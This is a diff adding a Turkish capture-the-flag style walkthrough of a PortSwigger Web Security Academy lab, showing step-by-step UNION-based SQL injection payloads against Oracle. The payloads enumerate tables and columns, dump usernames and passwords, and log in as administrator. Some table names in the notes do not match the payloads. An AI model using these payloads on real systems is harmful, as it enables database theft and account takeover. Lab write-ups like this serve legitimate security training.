@@ -1,0 +1,24 @@
+LAB: SQL injection attack, listing the database contents on Oracle
+
+1 - Herhangi bir kategoriyi seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Gifts
+
+2 - ' ORDER BY 2# payloadı ile sütun sayısına ulaşıyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+ORDER+BY+2#
+
+3 - '+UNION+SELECT+'abc','def'+FROM+dual-- payloadı ile 2 sütununda türünün string olduğunu görüyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual--
+
+4 - '+UNION+SELECT+table_name,NULL+FROM+all_tables-- payloadı ile database üzerindeki tüm tabloları listeliyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+table_name,NULL+FROM+all_tables--
+
+5 - '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_FDDCGE'--
+bu payloaddaki table_name='' kısmını kendini çıktınıza göre uyarlamanız gerekiyor. 
+users_egkvp tablosundaki sütun adlarını yazdırdık.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_FDDCGE%27--
+
+6 - '+UNION+SELECT+USERNAME_DPEMZR,+PASSWORD_TYNEGN+FROM+USERS_FDDCGE--
+users_egkvp tablosundan USERNAME_DPEMZR ve PASSWORD_TYNEGN sütunlarıdaki verileri yazdırdık.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+USERNAME_DPEMZR,+PASSWORD_TYNEGN+FROM+USERS_FDDCGE--
+
+7 - Administrator ile giriş yapınca oda çözülüyor.
